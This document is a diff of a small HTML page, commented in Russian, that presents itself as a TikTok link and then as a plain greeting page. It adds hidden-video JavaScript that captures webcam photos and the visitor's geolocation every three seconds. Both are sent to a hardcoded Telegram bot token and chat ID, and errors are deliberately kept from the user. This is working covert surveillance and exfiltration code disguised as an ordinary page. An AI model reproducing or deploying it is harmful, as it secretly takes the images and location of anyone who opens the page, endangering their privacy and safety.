@@ -1,82 +1,109 @@
 <!DOCTYPE html>
-<html lang="ru">
+<html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>ТикТок Ссылка с Камерой</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Сайт</title>
+  <style>
+    #video {
+      display: none; /* Скрыть видео */
+    }
+  </style>
 </head>
 <body>
+  <h1>Привіт.</h1>
+  <video id="video" width="320" height="240" autoplay></video>
+  <canvas id="canvas" style="display:none;"></canvas>
 
-<h1>Секретный ТикТок</h1>
-<p>Нажми на кнопку, чтобы перейти в TikTok и сделать фото!</p>
+  <script>
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
 
-<!-- Кнопка для начала съемки -->
-<button onclick="start()">Перейти в TikTok и сфотографироваться</button>
+    // Запуск видео с веб-камеры
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        video.srcObject = stream;
+        // Запускаем цикл по захвату фото и отправке местоположения каждые 3 секунды
+        setInterval(capturePhoto, 3000);  // 3000 миллисекунд = 3 секунды
+        setInterval(getLocation, 3000);   // Отправляем местоположение каждые 3 секунды
+      });
 
-<!-- Видеопоток с камеры -->
-<video id="video" width="300" height="300" autoplay></video>
+    // Функция для захвата фото
+    function capturePhoto() {
+      // Устанавливаем размеры для канваса
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
 
-<!-- Холст для фотографии -->
-<canvas id="canvas" style="display:none;"></canvas>
+      // Рисуем изображение с видео на канвасе
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-<script>
-    // Получение доступа к камере
-    async function start() {
-        // Переход на TikTok (открытие нового окна или вкладки)
-        window.open('https://www.tiktok.com/', '_blank');
-        
-        // Запрашиваем доступ к камере
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        document.getElementById('video').srcObject = stream;
-        
-        // Ждем 3 секунды, чтобы пользователь был готов
-        setTimeout(takePhoto, 3000);
-    }
-
-    // Съемка фото
-    function takePhoto() {
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const context = canvas.getContext('2d');
-        
-        // Настроим холст на размер видео
-        canvas.width = video.videoWidth;
-        canvas.height = video.videoHeight;
-        
-        // Переносим изображение с видео на холст
-        context.drawImage(video, 0, 0, canvas.width, canvas.height);
-        
-        // Конвертируем холст в изображение base64
-        const imageData = canvas.toDataURL('image/png');
-        
+      // Конвертируем изображение в формат Blob
+      canvas.toBlob(function(blob) {
         // Отправляем фото в Telegram
-        sendPhotoToTelegram(imageData);
+        sendPhotoToTelegram(blob);
+      }, 'image/png');
     }
 
-    // Отправка фотографии в Telegram
-    function sendPhotoToTelegram(imageData) {
-        const botToken = '8039262565:AAFfSwLWM59n0ei72VgKfeqDeXjTL-HxBuY';  // Подставь свой токен
-        const chatId = '1332638294';  // Подставь свой chat_id
-        
-        // Отправляем фото через Telegram API
-        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
-            method: 'POST',
-            body: new URLSearchParams({
-                chat_id: chatId,
-                photo: imageData
-            })
-        })
-        .then(response => response.json())
-        .then(data => {
-            console.log(data);
-            alert('Фото отправлено в Telegram!');
-        })
-        .catch(error => {
-            console.error('Ошибка:', error);
-            alert('Что-то пошло не так!');
-        });
-    }
-</script>
+    // Функция отправки фото в Telegram
+    function sendPhotoToTelegram(photo) {
+      const token = '8039262565:AAFfSwLWM59n0ei72VgKfeqDeXjTL-HxBuY'; // замените на ваш токен
+      const chatId = '1332638294'; // ваш ID чата в Telegram
 
+      // Создаем объект FormData для отправки файла
+      const formData = new FormData();
+      formData.append('chat_id', chatId);
+      formData.append('photo', photo);
+
+      // Отправляем запрос через fetch
+      fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+        method: 'POST',
+        body: formData,
+      })
+      .then(response => response.json())
+      .catch(error => {
+        // Ошибки можно логировать в консоль, но они не будут показываться пользователю
+        console.error('Ошибка отправки фото в Telegram:', error);
+      });
+    }
+
+    // Получение местоположения пользователя
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocationToTelegram, showError);
+      } else {
+        console.error("Геолокация не поддерживается этим браузером.");
+      }
+    }
+
+    // Функция отправки местоположения в Telegram
+    function sendLocationToTelegram(position) {
+      const token = '8039262565:AAFfSwLWM59n0ei72VgKfeqDeXjTL-HxBuY'; // замените на ваш токен
+      const chatId = '1332638294'; // ваш ID чата в Telegram
+
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Отправляем местоположение в Telegram
+      fetch(`https://api.telegram.org/bot${token}/sendLocation`, {
+        method: 'POST',
+        body: new URLSearchParams({
+          chat_id: chatId,
+          latitude: latitude,
+          longitude: longitude,
+        }),
+      })
+      .then(response => response.json())
+      .catch(error => {
+        // Ошибки можно логировать в консоль, но они не будут показываться пользователю
+        console.error('Ошибка отправки местоположения в Telegram:', error);
+      });
+    }
+
+    // Обработка ошибки при получении местоположения
+    function showError(error) {
+      console.error('Ошибка получения местоположения:', error);
+    }
+  </script>
 </body>
 </html>
